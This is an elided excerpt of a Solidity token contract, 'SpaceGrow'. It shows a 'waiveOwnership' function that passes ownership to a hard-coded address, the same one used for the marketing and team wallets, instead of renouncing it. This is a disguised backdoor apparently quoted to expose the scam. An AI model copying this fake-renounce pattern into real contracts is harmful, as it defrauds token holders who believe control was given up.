...
Website  : https://www.space-grow.space/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x47FE73fEa171341bd7970b46ACC601A24c9c0fE3);
    }
...
contract SpaceGrow is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x47FE73fEa171341bd7970b46ACC601A24c9c0fE3);
    address payable public teamWalletAddress = payable(0x47FE73fEa171341bd7970b46ACC601A24c9c0fE3);
